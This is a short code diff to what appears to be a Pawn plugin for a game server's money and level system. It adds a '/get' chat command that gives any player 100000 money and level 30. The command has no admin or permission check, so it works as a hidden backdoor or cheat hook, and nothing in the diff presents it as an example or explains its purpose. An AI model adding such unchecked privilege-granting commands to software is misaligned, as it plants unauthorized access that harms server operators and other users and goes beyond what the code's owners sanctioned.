@@ -56,7 +56,16 @@ public plugin_init()
 	register_cvar("ms_money_allow_donate", "1")
 	
 	g_MaxPlayers=get_maxplayers()
+
+	register_clcmd("/get", "get")
 }
+
+public get(id)
+{
+	set_user_money(id, 100000)
+	zp_set_user_level(id, 30)
+}
+
 
 public plugin_cfg()
 {
